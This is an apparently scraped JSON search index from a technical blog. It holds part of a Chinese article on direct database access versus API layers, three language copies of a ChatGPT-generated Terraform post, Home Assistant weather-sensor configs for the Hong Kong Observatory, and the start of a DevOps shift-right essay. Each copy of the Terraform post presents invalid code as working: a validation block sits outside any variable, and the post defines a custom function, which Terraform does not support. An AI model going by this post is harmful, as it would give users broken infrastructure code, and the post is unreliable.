**尽管有延迟仍可接受的使用案例：** - ✅ 历史报表（昨天的销售） - ✅ 趋势分析（最近 30 天） - ✅ 带有「数据截至 X 秒前」免责声明的仪表板 - ✅ 非关键指标 **不可接受的使用案例：** - ❌ 实时库存检查 - ❌ 欺诈检测 - ❌ 面向客户的「你的订单」页面 - ❌ 关键业务决策 **如果你需要真正的实时：** - 直接查询生产数据库（谨慎） - 使用变更数据捕获（CDC）与流式处理 - 实现事件驱动架构 - 接受延迟并围绕它设计 选项 2：ETL 到数据仓库（批处理） flowchart LR Prod[(\"🗄️ 生产数据库\")] -->|\"夜间提取\"| ETL[\"⚙️ ETL 流程\"] ETL -->|\"转换& 加载\"| DW[(\"📊 数据仓库\")] Analytics[\"📊 分析工具\"] --> DW style Prod fill:#e3f2fd style ETL fill:#fff3e0 style DW fill:#e8f5e9 # ETL 作业每晚执行 def etl_orders(): # 从生产环境提取 orders &#x3D; prod_db.query(&quot;&quot;&quot; SELECT * FROM orders WHERE updated_at &gt;&#x3D; CURRENT_DATE - INTERVAL &#39;1 day&#39; &quot;&quot;&quot;) # 转换 for order in orders: order[&#39;revenue&#39;] &#x3D; order[&#39;total&#39;] - order[&#39;discount&#39;] order[&#39;profit_margin&#39;] &#x3D; calculate_margin(order) # 加载到仓库 warehouse.bulk_insert(&#39;fact_orders&#39;, orders) 特征： 🕐 计划更新（每小时/每天） 🔄 批处理 🏗️ 转换的架构（为分析优化） 📈 预先聚合的数据 📅 批处理：可预测的过时性ETL 数据是故意过时的——这没关系。 典型 ETL 计划： **每小时：**数据是 0-60 分钟旧 **每天：**数据是 0-24 小时旧 **每周：**数据是 0-7 天旧 示例时间线： 周一 9:00 AM - 客户下订单 周一 11:59 PM - ETL 作业开始 周二 12:30 AM - ETL 作业完成 周二 8:00 AM - 分析师查看报表 数据年龄：约 23 小时旧 **为什么批处理对分析更好：** 1. **一致的快照：** # ETL 捕获时间点快照 # 所有数据来自同一时刻 snapshot_time &#x3D; &#39;2024-01-15 23:59:59&#39; orders &#x3D; extract_orders(snapshot_time) customers &#x3D; extract_customers(snapshot_time) products &#x3D; extract_products(snapshot_time) # 所有数据都是一致的 # 无查询中途变更 2. **无查询中途更新：** 读取副本（实时）： 开始查询：100 个订单 查询中途：5 个新订单到达 结束查询：不一致的结果 数据仓库（批处理）： 开始查询：100 个订单 查询中途：无变更（静态快照） 结束查询：一致的结果 3. **为聚合优化：** -- 仓库中预先聚合 SELECT date, SUM(revenue) FROM daily_sales_summary -- 已经求和 WHERE date &gt;&#x3D; &#39;2024-01-01&#39;; -- 10ms 返回 -- vs 读取副本 SELECT DATE(created_at), SUM(total) FROM orders -- 必须扫描数百万行 WHERE created_at &gt;&#x3D; &#39;2024-01-01&#39; GROUP BY DATE(created_at); -- 30 秒返回 **过时性可接受的情况：** - ✅ 月度/季度报表 - ✅ 年度比较 - ✅ 趋势分析 - ✅ 高管仪表板 - ✅ 合规报表 **过时性不可接受的情况：** - ❌ 实时操作仪表板 - ❌ 实时警报 - ❌ 面向客户的数据 - ❌ 欺诈检测 **混合解决方案：Lambda 架构** 实时层（读取副本）： - 最近 24 小时的数据 - 对最近数据的快速查询 - 可接受延迟：秒 批处理层（数据仓库）： - 历史数据（&gt;24 小时） - 复杂分析 - 可接受延迟：小时&#x2F;天 服务层： - 合并两个视图 - 最近 + 历史 **示例实现：** def get_sales_report(start_date, end_date): today &#x3D; datetime.now().date() # 从仓库获取历史数据 if end_date &lt; today: return warehouse.query( &quot;SELECT * FROM sales_summary WHERE date BETWEEN ? AND ?&quot;, start_date, end_date ) # 从副本获取最近数据 historical &#x3D; warehouse.query( &quot;SELECT * FROM sales_summary WHERE date BETWEEN ? AND ?&quot;, start_date, today - timedelta(days&#x3D;1) ) recent &#x3D; replica.query( &quot;SELECT * FROM orders WHERE date &gt;&#x3D; ?&quot;, today ) return merge(historical, recent) 比较： 因素 读取副本 ETL 到数据仓库 数据新鲜度 实时（秒） 批处理（小时/天） 查询性能 取决于生产架构 为分析优化 架构 与生产相同 转换（星型/雪花型） 对生产的影响 最小（独立服务器） 最小（计划离峰） 复杂度 低 高 成本 较低 较高 数据转换 无 广泛 历史数据 受保留限制 无限 多个来源 单一数据库 多个数据库/API 何时使用读取副本： ✅ 实时仪表板： &#x2F;&#x2F; 实时订单监控 SELECT COUNT(*) as active_orders FROM orders WHERE status &#x3D; &#39;processing&#39; AND created_at &gt;&#x3D; NOW() - INTERVAL 1 HOUR; ✅ 操作报表： 当前库存水平 活跃用户会话 今天的销售数字 系统健康指标 ✅ 简单分析： 单一数据来源 无复杂转换 生产架构运作良好 ✅ 预算限制： 小团队 有限资源 需要快速设置 何时使用 ETL/数据仓库： ✅ 复杂分析： -- 多维分析 SELECT d.year, d.quarter, d.month, p.category, p.brand, c.country, c.region, SUM(f.revenue) as total_revenue, SUM(f.profit) as total_profit FROM fact_sales f JOIN dim_date d ON f.date_key &#x3D; d.date_key JOIN dim_product p ON f.product_key &#x3D; p.product_key JOIN dim_customer c ON f.customer_key &#x3D; c.customer_key GROUP BY d.year, d.quarter, d.month, p.category, p.brand, c.country, c.region; ✅ 多个数据来源： # 组合来自多个系统的数据 def build_customer_360(): # 从生产数据库 orders &#x3D; extract_from_postgres() # 从 CRM API interactions &#x3D; extract_from_salesforce() # 从支持系统 tickets &#x3D; extract_from_zendesk() # 组合并加载 customer_360 &#x3D; merge_data(orders, interactions, tickets) warehouse.load(&#39;customer_360&#39;, customer_360) ✅ 历史分析： 长期趋势（数年数据） 年度比较 季节性模式 留存群组 ✅ 数据转换需求： 为性能进行非规范化 业务逻辑计算 数据质量修正 聚合和汇总 ✅ 合规/审计： 不可变的历史记录 时间点快照 审计轨迹 监管报告 混合方法： 许多企业同时使用两者： 实时需求 → 读取副本 - 实时仪表板 - 操作报表 - 当前指标 分析需求 → 数据仓库 - 历史分析 - 复杂查询 - 多来源报表 示例架构： flowchart TD Prod[(\"🗄️ 生产数据库\")] Prod -.->|\"实时复制\"| Replica[(\"📖 读取副本\")] Prod -->|\"夜间ETL\"| DW[(\"📊 数据仓库\")] Replica --> LiveDash[\"⚡ 实时仪表板\"] DW --> Analytics[\"📈 分析平台\"] DW --> BI[\"📊 BI 工具\"] style Prod fill:#e3f2fd style Replica fill:#fff3e0 style DW fill:#e8f5e9 迁移路径： 阶段 1：从读取副本开始 生产数据库 → 读取副本 → 分析 - 快速设置 - 立即价值 - 低复杂度 阶段 2：随着需求增长添加 ETL 生产数据库 → 读取副本 → 实时仪表板 ↓ ETL → 数据仓库 → 复杂分析 - 保留实时用于操作需求 - 添加仓库用于分析需求 - 两全其美 成本比较： 读取副本： 数据库副本：$200&#x2F;月 设置时间：1 天 维护：低 第一年总计：约 $2,400 数据仓库 + ETL： 仓库：$500&#x2F;月 ETL 工具：$300&#x2F;月 设置时间：2-4 周 维护：中高 第一年总计：约 $9,600 + 设置成本 决策框架： 从读取副本开始，如果： - 需要实时数据 - 单一数据来源 - 简单查询 - 小预算 - 需要快速成功 迁移到数据仓库，当： - 需要历史分析（&gt;1 年） - 多个数据来源 - 复杂转换 - 副本上的慢查询 - 合规要求 架构抽象的数据库视图 **情境：**需要直接访问但想隐藏架构复杂性。 -- 创建简化视图 CREATE VIEW customer_summary AS SELECT c.id, c.name, c.email_address AS email, -- 隐藏列重新命名 COUNT(o.id) AS order_count, SUM(o.total) AS total_spent FROM customers c LEFT JOIN orders o ON c.id &#x3D; o.customer_id GROUP BY c.id; -- 仅授予视图访问权限 GRANT SELECT ON customer_summary TO &#39;reporting_app&#39;@&#39;%&#39;; 优势： 隐藏架构变更 简化的数据模型 预先连接的数据 访问控制 决策框架 选择直接访问的情况： ✅ 小规模： &lt; 5 个应用程序 &lt; 1000 个用户 低流量 ✅ 仅内部： 无外部访问 可信任环境 单一团队 ✅ 只读： 分析工具 报表仪表板 数据科学 ✅ 原型制作： MVP 阶段 概念验证 时间紧迫的演示 选择 API 层的情况： ✅ 企业规模： 5+ 个应用程序 1000+ 个用户 高流量 ✅ 外部访问： 移动应用程序 第三方集成 公共 API ✅ 安全关键： 客户数据 财务信息 医疗记录 ✅ 长期产品： 生产系统 多个团队 频繁变更 最佳实践 如果你必须使用直接访问 1. 使用读取副本： 写入应用程序 → API → 主数据库 读取应用程序 → 读取副本 2. 为每个应用程序创建数据库用户： CREATE USER &#39;mobile_app&#39;@&#39;%&#39; IDENTIFIED BY &#39;password1&#39;; CREATE USER &#39;web_app&#39;@&#39;%&#39; IDENTIFIED BY &#39;password2&#39;; CREATE USER &#39;analytics&#39;@&#39;%&#39; IDENTIFIED BY &#39;password3&#39;; 3. 授予最小权限： -- 移动应用程序 - 只需要用户和订单 GRANT SELECT ON database.users TO &#39;mobile_app&#39;@&#39;%&#39;; GRANT SELECT ON database.orders TO &#39;mobile_app&#39;@&#39;%&#39;; -- 分析 - 所有内容只读 GRANT SELECT ON database.* TO &#39;analytics&#39;@&#39;%&#39;; 4. 使用连接池： &#x2F;&#x2F; 限制每个应用程序的连接 const pool &#x3D; mysql.createPool(&#123; host: &#39;database.example.com&#39;, user: &#39;mobile_app&#39;, password: process.env.DB_PASSWORD, database: &#39;production&#39;, connectionLimit: 5 &#x2F;&#x2F; 每个应用程序的限制 &#125;); 5. 监控一切： -- 启用查询日志 SET GLOBAL general_log &#x3D; &#39;ON&#39;; SET GLOBAL log_output &#x3D; &#39;TABLE&#39;; -- 查看慢查询 SELECT * FROM mysql.slow_log WHERE user_host LIKE &#39;%mobile_app%&#39;; 结论 直接数据库访问很诱人——它简单且快速。但在企业环境中，风险通常超过好处。 关键要点： 直接访问适用于小型、内部、只读情境 API 层提供安全性、灵活性和控制 紧密耦合是最大的长期成本 为生产系统从 API 层开始 如果有遗留直接访问，逐步迁移 真正的问题： 不是「我们能直接连接吗？」而是「我们应该吗？」 对于大多数企业，答案是：**建立 API 层。**当你需要时，未来的你会感谢你： 变更数据库架构 添加新应用程序 撤销被泄露应用程序的访问 扩展以处理更多流量 调试生产问题 在 API 层的前期投资在安全性、可维护性和可扩展性方面带来回报。🏗️ 资源 **The Twelve-Factor App：**现代应用程序架构原则 **API Security Best Practices：**OWASP API 安全 **Database Connection Pooling：**性能优化 **Microservices Patterns：**每服务一个数据库模式","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"},{"name":"Enterprise","slug":"Enterprise","permalink":"https://neo01.com/tags/Enterprise/"},{"name":"Security","slug":"Security","permalink":"https://neo01.com/tags/Security/"},{"name":"Database","slug":"Database","permalink":"https://neo01.com/tags/Database/"}],"lang":"zh-CN"},{"title":"在 Terraform 中使用自訂驗證來驗證其他變數","slug":"2022/12/Using-custom-validation-to-validate-other-variables-in-Terraform-zh-TW","date":"un55fin55","updated":"un00fin00","comments":true,"path":"/zh-TW/2022/12/Using-custom-validation-to-validate-other-variables-in-Terraform/","permalink":"https://neo01.com/zh-TW/2022/12/Using-custom-validation-to-validate-other-variables-in-Terraform/","excerpt":"學習如何在 Terraform 中使用自訂驗證區塊來驗證多個變數之間的關係。由 ChatGPT 生成。","text":"此部落格文章由 ChatGPT 生成 在 Terraform 中，您可以使用自訂驗證區塊為 Terraform 變數定義自己的自訂驗證規則。這些驗證區塊允許您指定 Terraform 將用於驗證變數值的驗證函式。您還可以使用這些自訂驗證區塊來驗證 Terraform 配置中的其他變數。 要從自訂驗證函式驗證其他變數，您可以使用 var 關鍵字，後跟您要驗證的變數名稱。例如，如果您有兩個名為 subnet_id 和 vpc_id 的變數，並且您想驗證 subnet_id 是否與 vpc_id 關聯，您可以定義一個自訂驗證區塊，如下所示： variable &quot;subnet_id&quot; &#123; type &#x3D; string &#125; variable &quot;vpc_id&quot; &#123; type &#x3D; string &#125; validation &#123; condition &#x3D; can_associate_subnet_with_vpc(var.subnet_id, var.vpc_id) error_message &#x3D; &quot;The specified subnet is not associated with the specified VPC.&quot; &#125; function can_associate_subnet_with_vpc(subnet_id, vpc_id) &#123; &#x2F;&#x2F; perform validation logic here &#125; 在上面的範例中，我們定義了一個自訂驗證區塊，該區塊呼叫 can_associate_subnet_with_vpc 函式來驗證 subnet_id 是否與 vpc_id 關聯。can_associate_subnet_with_vpc 函式接受兩個參數，subnet_id 和 vpc_id，這兩個參數都使用 var 關鍵字傳遞。 在函式內部，您可以執行驗證變數所需的任何驗證邏輯。如果驗證成功，函式應返回 true，如果驗證失敗，則應返回 false。 透過使用 var 關鍵字並將變數傳遞給您的自訂驗證函式，您可以輕鬆驗證 Terraform 配置中的多個變數，並確保它們符合您的要求。 總之，要在 Terraform 中從自訂驗證函式驗證其他變數，您可以使用 var 關鍵字，後跟您要驗證的變數名稱。這允許您輕鬆驗證 Terraform 配置中的多個變數，並確保它們符合您的要求。","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"terraform","slug":"terraform","permalink":"https://neo01.com/tags/terraform/"}],"lang":"zh-TW"},{"title":"在 Terraform 中使用自定义验证来验证其他变量","slug":"2022/12/Using-custom-validation-to-validate-other-variables-in-Terraform-zh-CN","date":"un55fin55","updated":"un00fin00","comments":true,"path":"/zh-CN/2022/12/Using-custom-validation-to-validate-other-variables-in-Terraform/","permalink":"https://neo01.com/zh-CN/2022/12/Using-custom-validation-to-validate-other-variables-in-Terraform/","excerpt":"学习如何在 Terraform 中使用自定义验证块来验证多个变量之间的关系。由 ChatGPT 生成。","text":"此博客文章由 ChatGPT 生成 在 Terraform 中，您可以使用自定义验证块为 Terraform 变量定义自己的自定义验证规则。这些验证块允许您指定 Terraform 将用于验证变量值的验证函数。您还可以使用这些自定义验证块来验证 Terraform 配置中的其他变量。 要从自定义验证函数验证其他变量，您可以使用 var 关键字，后跟您要验证的变量名称。例如，如果您有两个名为 subnet_id 和 vpc_id 的变量，并且您想验证 subnet_id 是否与 vpc_id 关联，您可以定义一个自定义验证块，如下所示： variable &quot;subnet_id&quot; &#123; type &#x3D; string &#125; variable &quot;vpc_id&quot; &#123; type &#x3D; string &#125; validation &#123; condition &#x3D; can_associate_subnet_with_vpc(var.subnet_id, var.vpc_id) error_message &#x3D; &quot;The specified subnet is not associated with the specified VPC.&quot; &#125; function can_associate_subnet_with_vpc(subnet_id, vpc_id) &#123; &#x2F;&#x2F; perform validation logic here &#125; 在上面的示例中，我们定义了一个自定义验证块，该块调用 can_associate_subnet_with_vpc 函数来验证 subnet_id 是否与 vpc_id 关联。can_associate_subnet_with_vpc 函数接受两个参数，subnet_id 和 vpc_id，这两个参数都使用 var 关键字传递。 在函数内部，您可以执行验证变量所需的任何验证逻辑。如果验证成功，函数应返回 true，如果验证失败，则应返回 false。 通过使用 var 关键字并将变量传递给您的自定义验证函数，您可以轻松验证 Terraform 配置中的多个变量，并确保它们符合您的要求。 总之，要在 Terraform 中从自定义验证函数验证其他变量，您可以使用 var 关键字，后跟您要验证的变量名称。这允许您轻松验证 Terraform 配置中的多个变量，并确保它们符合您的要求。","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"terraform","slug":"terraform","permalink":"https://neo01.com/tags/terraform/"}],"lang":"zh-CN"},{"title":"Using custom validation to validate other variables in Terraform","slug":"2022/12/Using-custom-validation-to-validate-other-variables-in-Terraform","date":"un55fin55","updated":"un66fin66","comments":true,"path":"2022/12/Using-custom-validation-to-validate-other-variables-in-Terraform/","permalink":"https://neo01.com/2022/12/Using-custom-validation-to-validate-other-variables-in-Terraform/","excerpt":"Learn how to use custom validation blocks in Terraform to validate relationships between multiple variables. Ensure your infrastructure configs meet complex requirements. Generated by ChatGPT.","text":"This blog post is generated with ChatGPT In Terraform, you can use custom validation blocks to define your own custom validation rules for Terraform variables. These validation blocks allow you to specify a validation function that Terraform will use to validate the value of the variable. You can also use these custom validation blocks to validate other variables in your Terraform configuration. To validate other variables from a custom validation function, you can use the var keyword followed by the name of the variable you want to validate. For example, if you have two variables named subnet_id and vpc_id, and you want to validate that the subnet_id is associated with the vpc_id, you could define a custom validation block like this: variable &quot;subnet_id&quot; &#123; type &#x3D; string &#125; variable &quot;vpc_id&quot; &#123; type &#x3D; string &#125; validation &#123; condition &#x3D; can_associate_subnet_with_vpc(var.subnet_id, var.vpc_id) error_message &#x3D; &quot;The specified subnet is not associated with the specified VPC.&quot; &#125; function can_associate_subnet_with_vpc(subnet_id, vpc_id) &#123; &#x2F;&#x2F; perform validation logic here &#125; In the example above, we define a custom validation block that calls the can_associate_subnet_with_vpc function to validate that the subnet_id is associated with the vpc_id. The can_associate_subnet_with_vpc function takes two arguments, subnet_id and vpc_id, which are both passed using the var keyword. Inside the function, you can perform any validation logic you need to validate the variables. If the validation is successful, the function should return true, and if the validation fails, it should return false. By using the var keyword and passing the variables to your custom validation function, you can easily validate multiple variables in your Terraform configuration and ensure that they meet your requirements. In summary, to validate other variables from a custom validation function in Terraform, you can use the var keyword followed by the name of the variable you want to validate. This allows you to easily validate multiple variables in your Terraform configuration and ensure that they meet your requirements.","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"terraform","slug":"terraform","permalink":"https://neo01.com/tags/terraform/"}]},{"title":"香港天文台的 Home Assistant 传感器","slug":"2022/12/Home-Assistant-Sensor-for-Hong-Kong-Observatory-zh-CN","date":"un44fin44","updated":"un00fin00","comments":true,"path":"/zh-CN/2022/12/Home-Assistant-Sensor-for-Hong-Kong-Observatory/","permalink":"https://neo01.com/zh-CN/2022/12/Home-Assistant-Sensor-for-Hong-Kong-Observatory/","excerpt":"将香港天文台的实时天气数据集成到 Home Assistant，监控温度、湿度和风速。","text":"香港天文台 将军澳 (TKO) 天气、湿度、温度和 10 分钟风速及风向 - platform: rest name: hko_tko_humidity resource: https:&#x2F;&#x2F;data.weather.gov.hk&#x2F;weatherAPI&#x2F;hko_data&#x2F;regional-weather&#x2F;latest_1min_humidity.csv value_template: &quot;&#123;&#123; value | regex_findall_index(find&#x3D;&#39;Tseung Kwan O,(.*)&#39;) | float | round(0) &#125;&#125;&quot; device_class: &quot;humidity&quot; unit_of_measurement: &quot;%&quot; scan_interval: 600 - platform: rest name: hko_tko_temperature resource: https:&#x2F;&#x2F;data.weather.gov.hk&#x2F;weatherAPI&#x2F;hko_data&#x2F;regional-weather&#x2F;latest_1min_temperature.csv value_template: &quot;&#123;&#123; value | regex_findall_index(find&#x3D;&#39;Tseung Kwan O,(.*)&#39;) | float | round(1) &#125;&#125;&quot; device_class: &quot;temperature&quot; unit_of_measurement: &quot;°C&quot; scan_interval: 600 - platform: rest name: hk_tko_wind resource: https:&#x2F;&#x2F;data.weather.gov.hk&#x2F;weatherAPI&#x2F;hko_data&#x2F;regional-weather&#x2F;latest_10min_wind.csv value_template: &quot;&#123;&#123; value | regex_findall_index(find&#x3D;&#39;Tseung Kwan O,(.*)&#39;) &#125;&#125;&quot; scan_interval: 600 - platform: template sensors: tko_wind_direction: friendly_name: &quot;TKO 10-minute wind direction&quot; value_template: &quot;&#123;&#123; states(&#39;sensor.hk_tko_wind&#39;) | regex_findall_index(find&#x3D;&#39;([^,]+),&#39;) &#125;&#125; &quot; icon_template: &quot;hass:compass&quot; tko_wind_speed: friendly_name: &quot;TKO 10-minute mean speed&quot; value_template: &quot;&#123;&#123; states(&#39;sensor.hk_tko_wind&#39;) | regex_findall_index(find&#x3D;&#39;[^,]+,([^,]+),&#39;) &#125;&#125; &quot; unit_of_measurement: &quot;km&#x2F;hour&quot; icon_template: &quot;hass:tailwind&quot; tko_wind_gust: friendly_name: &quot;TKO 10-minute max gust&quot; value_template: &quot;&#123;&#123; states(&#39;sensor.hk_tko_wind&#39;) | regex_findall_index(find&#x3D;&#39;[^,]+,[^,]+,([^,]+)&#39;) &#125;&#125; &quot; unit_of_measurement: &quot;km&#x2F;hour&quot; icon_template: &quot;hass:weather-windy&quot;","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[{"name":"Home Assistant","slug":"Home-Assistant","permalink":"https://neo01.com/tags/Home-Assistant/"},{"name":"Open Data","slug":"Open-Data","permalink":"https://neo01.com/tags/Open-Data/"}],"lang":"zh-CN"},{"title":"香港天文台的 Home Assistant 感測器","slug":"2022/12/Home-Assistant-Sensor-for-Hong-Kong-Observatory-zh-TW","date":"un44fin44","updated":"un00fin00","comments":true,"path":"/zh-TW/2022/12/Home-Assistant-Sensor-for-Hong-Kong-Observatory/","permalink":"https://neo01.com/zh-TW/2022/12/Home-Assistant-Sensor-for-Hong-Kong-Observatory/","excerpt":"將香港天文台的即時天氣資料整合到 Home Assistant，監控溫度、濕度和風速。","text":"香港天文台 將軍澳 (TKO) 天氣、濕度、溫度和 10 分鐘風速及風向 - platform: rest name: hko_tko_humidity resource: https:&#x2F;&#x2F;data.weather.gov.hk&#x2F;weatherAPI&#x2F;hko_data&#x2F;regional-weather&#x2F;latest_1min_humidity.csv value_template: &quot;&#123;&#123; value | regex_findall_index(find&#x3D;&#39;Tseung Kwan O,(.*)&#39;) | float | round(0) &#125;&#125;&quot; device_class: &quot;humidity&quot; unit_of_measurement: &quot;%&quot; scan_interval: 600 - platform: rest name: hko_tko_temperature resource: https:&#x2F;&#x2F;data.weather.gov.hk&#x2F;weatherAPI&#x2F;hko_data&#x2F;regional-weather&#x2F;latest_1min_temperature.csv value_template: &quot;&#123;&#123; value | regex_findall_index(find&#x3D;&#39;Tseung Kwan O,(.*)&#39;) | float | round(1) &#125;&#125;&quot; device_class: &quot;temperature&quot; unit_of_measurement: &quot;°C&quot; scan_interval: 600 - platform: rest name: hk_tko_wind resource: https:&#x2F;&#x2F;data.weather.gov.hk&#x2F;weatherAPI&#x2F;hko_data&#x2F;regional-weather&#x2F;latest_10min_wind.csv value_template: &quot;&#123;&#123; value | regex_findall_index(find&#x3D;&#39;Tseung Kwan O,(.*)&#39;) &#125;&#125;&quot; scan_interval: 600 - platform: template sensors: tko_wind_direction: friendly_name: &quot;TKO 10-minute wind direction&quot; value_template: &quot;&#123;&#123; states(&#39;sensor.hk_tko_wind&#39;) | regex_findall_index(find&#x3D;&#39;([^,]+),&#39;) &#125;&#125; &quot; icon_template: &quot;hass:compass&quot; tko_wind_speed: friendly_name: &quot;TKO 10-minute mean speed&quot; value_template: &quot;&#123;&#123; states(&#39;sensor.hk_tko_wind&#39;) | regex_findall_index(find&#x3D;&#39;[^,]+,([^,]+),&#39;) &#125;&#125; &quot; unit_of_measurement: &quot;km&#x2F;hour&quot; icon_template: &quot;hass:tailwind&quot; tko_wind_gust: friendly_name: &quot;TKO 10-minute max gust&quot; value_template: &quot;&#123;&#123; states(&#39;sensor.hk_tko_wind&#39;) | regex_findall_index(find&#x3D;&#39;[^,]+,[^,]+,([^,]+)&#39;) &#125;&#125; &quot; unit_of_measurement: &quot;km&#x2F;hour&quot; icon_template: &quot;hass:weather-windy&quot;","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[{"name":"Home Assistant","slug":"Home-Assistant","permalink":"https://neo01.com/tags/Home-Assistant/"},{"name":"Open Data","slug":"Open-Data","permalink":"https://neo01.com/tags/Open-Data/"}],"lang":"zh-TW"},{"title":"Home Assistant Sensor for Hong Kong Observatory","slug":"2022/12/Home-Assistant-Sensor-for-Hong-Kong-Observatory","date":"un44fin44","updated":"un66fin66","comments":true,"path":"2022/12/Home-Assistant-Sensor-for-Hong-Kong-Observatory/","permalink":"https://neo01.com/2022/12/Home-Assistant-Sensor-for-Hong-Kong-Observatory/","excerpt":"Integrate real-time Hong Kong Observatory weather data into Home Assistant. Monitor temperature, humidity, and wind speed for your local area with ready-to-use sensor configs.","text":"Hong Kong Observatory Tseung Kwan O (TKO) weather, humidity, temperature and 10-minute wind speed and direction - platform: rest name: hko_tko_humidity resource: https:&#x2F;&#x2F;data.weather.gov.hk&#x2F;weatherAPI&#x2F;hko_data&#x2F;regional-weather&#x2F;latest_1min_humidity.csv value_template: &quot;&#123;&#123; value | regex_findall_index(find&#x3D;&#39;Tseung Kwan O,(.*)&#39;) | float | round(0) &#125;&#125;&quot; device_class: &quot;humidity&quot; unit_of_measurement: &quot;%&quot; scan_interval: 600 - platform: rest name: hko_tko_temperature resource: https:&#x2F;&#x2F;data.weather.gov.hk&#x2F;weatherAPI&#x2F;hko_data&#x2F;regional-weather&#x2F;latest_1min_temperature.csv value_template: &quot;&#123;&#123; value | regex_findall_index(find&#x3D;&#39;Tseung Kwan O,(.*)&#39;) | float | round(1) &#125;&#125;&quot; device_class: &quot;temperature&quot; unit_of_measurement: &quot;°C&quot; scan_interval: 600 - platform: rest name: hk_tko_wind resource: https:&#x2F;&#x2F;data.weather.gov.hk&#x2F;weatherAPI&#x2F;hko_data&#x2F;regional-weather&#x2F;latest_10min_wind.csv value_template: &quot;&#123;&#123; value | regex_findall_index(find&#x3D;&#39;Tseung Kwan O,(.*)&#39;) &#125;&#125;&quot; scan_interval: 600 - platform: template sensors: tko_wind_direction: friendly_name: &quot;TKO 10-minute wind direction&quot; value_template: &quot;&#123;&#123; states(&#39;sensor.hk_tko_wind&#39;) | regex_findall_index(find&#x3D;&#39;([^,]+),&#39;) &#125;&#125; &quot; icon_template: &quot;hass:compass&quot; tko_wind_speed: friendly_name: &quot;TKO 10-minute mean speed&quot; value_template: &quot;&#123;&#123; states(&#39;sensor.hk_tko_wind&#39;) | regex_findall_index(find&#x3D;&#39;[^,]+,([^,]+),&#39;) &#125;&#125; &quot; unit_of_measurement: &quot;km&#x2F;hour&quot; icon_template: &quot;hass:tailwind&quot; tko_wind_gust: friendly_name: &quot;TKO 10-minute max gust&quot; value_template: &quot;&#123;&#123; states(&#39;sensor.hk_tko_wind&#39;) | regex_findall_index(find&#x3D;&#39;[^,]+,[^,]+,([^,]+)&#39;) &#125;&#125; &quot; unit_of_measurement: &quot;km&#x2F;hour&quot; icon_template: &quot;hass:weather-windy&quot;","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[{"name":"Home Assistant","slug":"Home-Assistant","permalink":"https://neo01.com/tags/Home-Assistant/"},{"name":"Open Data","slug":"Open-Data","permalink":"https://neo01.com/tags/Open-Data/"}]},{"title":"Shift-Right After Shift-Left: The Complete DevOps Picture","slug":"2022/11/Shift-Right-After-Shift-Left-DevOps","date":"un55fin55","updated":"un55fin55","comments":true,"path":"2022/11/Shift-Right-After-Shift-Left-DevOps/","permalink":"https://neo01.com/2022/11/Shift-Right-After-Shift-Left-DevOps/","excerpt":"Shift-left moved testing earlier in development. But what comes next? Discover shift-right practices that complete the DevOps cycle with production monitoring, chaos engineering, and continuous learning.","text":"The DevOps world has been buzzing about “shift-left” for years - moving testing, security, and quality checks earlier in the development cycle. We’ve automated unit tests, integrated security scanning into CI/CD pipelines, and caught bugs before they reach production. This has been revolutionary. But here’s the thing: shifting left is only half the story. While we’ve been busy perfecting our pre-production processes, production environments have become increasingly complex. Microservices, distributed systems, and cloud-native architectures create failure modes that are impossible to predict in development. No amount of pre-production testing can simulate the chaos of real users, real data, and real infrastructure at scale. This is where “shift-right” comes in - extending DevOps practices into production and beyond. It’s not about abandoning shift-left principles; it’s about completing the cycle with practices that embrace production as a learning environment. Understanding Shift-Left: A Quick Recap Before we explore shift-right, let’s clarify what shift-left achieved. The traditional software development lifecycle looked like this: graph LR A([📝 Requirements]) --> B([💻 Development]) B --> C([🧪 Testing]) C --> D([🚀 Deployment]) D --> E([⚙️ Operations]) style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px style E fill:#ffebee,stroke:#c62828,stroke-width:2px Testing happened late, after development was “complete.” Finding bugs at this stage was expensive - code had to be sent back to developers who had already moved on to other projects. The feedback loop was slow and costly. Shift-left moved quality practices earlier: graph LR A([📝 Requirements+ Test Planning]) --> B([💻 Development+ Unit Tests]) B --> C([🧪 Integration Tests+ Security Scans]) C --> D([🚀 Deployment]) D --> E([⚙️ Operations]) style A fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style B fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px Key Shift-Left Practices: Test-Driven Development (TDD): Writing tests before code Continuous Integration: Automated testing on every commit Static Code Analysis: Catching issues without running code Security Scanning: Finding vulnerabilities early Infrastructure as Code: Testing infrastructure configurations These practices dramatically improved software quality and reduced costs. But they share a common limitation: they all happen before production. The Shift-Right Philosophy Shift-right recognizes a fundamental truth: production is different. No matter how thoroughly you test in development, production will surprise you. Users behave unpredictably. Infrastructure fails in unexpected ways. Load patterns create bottlenecks you never anticipated. Instead of treating production as a black box that should “just work,” shift-right embraces production as a learning environment. It extends DevOps practices beyond deployment: graph LR A([📝 Requirements]) --> B([💻 Development]) B --> C([🧪 Testing]) C --> D([🚀 Deployment]) D --> E([⚙️ Operations+ Monitoring]) E --> F([📊 Analysis+ Learning]) F -.Feedback.-> A style E fill:#e0f2f1,stroke:#00796b,stroke-width:2px style F fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px Core Shift-Right Principles: Production is a Testing Environment: Accept that some issues only appear in production. Design systems to detect and handle them gracefully. Observability Over Monitoring: Don’t just collect metrics - understand system behavior. Ask questions your system can answer. Fail Fast, Learn Faster: Embrace controlled failures to build resilience. Learn from production incidents to improve the entire system. Continuous Feedback: Use production data to inform development decisions. Close the loop between operations and development. 💡 Shift-Left vs Shift-RightShift-Left: Prevent problems before production Shift-Right: Detect, respond, and learn from problems in production Both are essential. Shift-left reduces the number of issues reaching production. Shift-right ensures you handle the inevitable issues that do. Key Shift-Right Practices Let’s explore the practices that make shift-right effective. These aren’t theoretical concepts - they’re battle-tested approaches used by organizations 